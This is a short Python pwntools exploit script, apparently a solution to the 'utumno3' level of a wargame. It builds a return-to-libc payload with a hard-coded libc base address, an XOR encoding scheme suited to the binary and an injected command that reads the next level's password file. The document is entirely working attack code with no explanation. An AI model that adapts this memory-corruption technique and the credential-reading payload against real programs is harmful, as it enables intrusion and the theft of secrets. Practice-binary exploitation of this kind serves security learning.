#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./utumno3')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7c00000              # Set base address

system = libc.sym['system']            # Grab location of system
# binsh = next(libc.search(b'/bin/sh'))  # grab string location
binsh = 0xffffcf78
cmd = b'cat /etc/utumno_pass/utumno4\x00' * 5

addresses = p32(system)
addresses += p32(0x0)
addresses += p32(binsh)
addresses += cmd

log.info("System is: " + system.to_bytes(4, 'big').hex())
log.info("Binsh is: " + binsh.to_bytes(4, 'big').hex())

a = 0
ka = 36
payload = b''
for i in range(len(addresses)):
    payload += (ka ^ (3 * a)).to_bytes(1, 'big')
    payload += addresses[i].to_bytes(1, 'big')
    ka += 1
    a += 1
    
    if a == 20:
        payload += (28 ^ (3 * a)).to_bytes(1, 'big') + b'\x00'
        a = 1

payload += b'\xff' * 40
p.clean()
pause()
p.sendline(payload.decode('latin-1'))
log.info(p.clean())
